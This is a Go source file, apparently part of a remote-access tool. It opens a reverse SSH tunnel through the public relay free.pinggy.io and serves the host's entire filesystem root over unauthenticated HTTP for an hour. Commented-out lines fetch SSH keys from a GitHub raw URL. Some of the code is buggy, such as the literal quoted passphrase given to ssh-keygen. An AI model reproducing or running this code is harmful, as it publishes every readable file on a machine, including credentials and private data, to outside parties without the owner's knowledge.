package tunnel

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)



var port string = ":3005"
var system string = "windows"
//var logF string = "info.txt"
var timeToLiveServer time.Duration = 60 //minutes



type InfoTunnel struct{
	Status bool
	Info string
}


func InitTunne()InfoTunnel{
	
	var out bytes.Buffer
	var err bytes.Buffer
	//var command string = fmt.Sprintf(`ssh -i .\key -T -p 443 -R0:127.0.0.1:%s free.pinggy.io > %s`, port)
	var command string 

	if (runtime.GOOS == "linux") {
		command = fmt.Sprintf(`ssh -i ./key -T -p 443 -R0:127.0.0.1%s free.pinggy.io`, port)
	
	}else if(runtime.GOOS == "windows"){
		command = fmt.Sprintf(`ssh -i .\key -T -p 443 -R0:127.0.0.1%s free.pinggy.io`, port)
	
	}
	//runTunnel  := commandToRun(system, command)	
	
	ui := strings.Split(command, " ")
	


	fmt.Println("Verificando key....")
	time.Sleep(2 * time.Second)
	key := existsFile("key")
	 if(key == false){
		fmt.Println("No existen las keys,... copiando.....")
		time.Sleep(2 * time.Second)
		generateK()
		//wget("https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key", "key") 
		//wget("https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key.pub", "key.pub")

	 	// var cpKey string = "iwr https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key -outfile key"
	 	// var cpKeyPub string = "iwr https://raw.githubusercontent.com/xosuu/messi/refs/heads/main/key.pub -outfile key.pub"
	
		// 	copyKey := commandToRun(system, cpKey)
	// 	copyKeyPub := commandToRun(system, cpKeyPub)
		// copiK := strings.Split(cpKey, " ")
		// copiPub := strings.Split(cpKeyPub, " ")
		

		
	 	// exec.Command(copiK[0], copiK[1], copiK[2], copiK[3]).Run()
	 	// exec.Command(copiPub[0], copiPub[1], copiPub[2], copiPub[3]).Run()

	 }


	fmt.Println("Starting pinggy....")
	cmd := exec.Command(ui[0], ui[1], ui[2], ui[3], ui[4], ui[5], ui[6], ui[7])
	cmd.Stdout = &out
	cmd.Stderr = &err
	
	go func () {
		cmd.Run()
		
	}()
	
	fmt.Println("Espera... consiguiendo data pinggy.....")
	time.Sleep(10 * time.Second)
	return InfoTunnel{Status: true, Info: out.String() + " "+ err.String() } 
}



func ServerTunn()bool{
	fmt.Println("start serv...")
	server := &http.Server{
		Addr: port,
	}
	
	resp :=http.FileServer(http.Dir("/"))
	
	http.Handle("/", resp)
	

	fmt.Println("INICIANDO SERVER..")

	go func (){
		server.ListenAndServe()
	}()
	
	fmt.Println("Hecho. server iniciado y programado para apagado")
	//apagar servidor en 60 minutos
	time.Sleep(timeToLiveServer * time.Minute)
	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()
	server.Shutdown(ctx)
	return true


}



func existsFile(file string)bool{
	_, err := os.Stat(file)
	if(err != nil){
		return false
	}

	return true
}


func commandToRun(os string, command string)[3]string{

	type Os struct {
		Windows [3]string 
		Linux [3]string 
	}

	cmd := Os{
		Windows: [3]string{"powershell", "-command", command}, 
		Linux: [3]string{"bash", "-c", command},
	}


	sys := bytes.ToLower([]byte(os))
	if( string(sys) == "linux" )  {
		return cmd.Linux
	}else if ( string(sys) == "windows"){
		return cmd.Windows
	}
	
	return [3]string{"Os", "No", "Available"}
}




func wget(url string, name string)bool{
	key, err := http.Get(url)
		if (err != nil){
			fmt.Println(err)
		}
		defer key.Body.Close()

	file, e := os.Create(name)
	if(e != nil){
		fmt.Println(e)
	}
	defer file.Close()
	io.Copy(file, key.Body)
	return true
}


func generateK()bool{
	var info bytes.Buffer
	var err bytes.Buffer
	// var comnd string
	
	// if(runtime.GOOS == "linux"){
	// 	comnd = `ssh-keygen -f key -N "" -t rsa`
	// }else if(runtime.GOOS == "windows"){
	// 	var vacio string = `'""'`
	// 	comnd = fmt.Sprintf(`ssh-keygen -f key -N %s -t rsa`,vacio)
	// }
	//command := strings.Split(comnd, " ")

	fmt.Println("Genreando....")
	//cmd := exec.Command(command[0], command[1], command[2], command[3], command[4], command[5], command[6])
	cmd := exec.Command("ssh-keygen", "-f", "key", "-N", `'""'`, "-t", "rsa")
	cmd.Stdout = &info 
	cmd.Stderr = &err

	cmd.Run()
	fmt.Println("Hecho keys creadasd.....")
	time.Sleep(2 * time.Second)
	fmt.Println("infoooooo:::",info.String())
	fmt.Println("ERROOOOOOR: ",err.String())
	time.Sleep(2 * time.Second)
	return true

	
}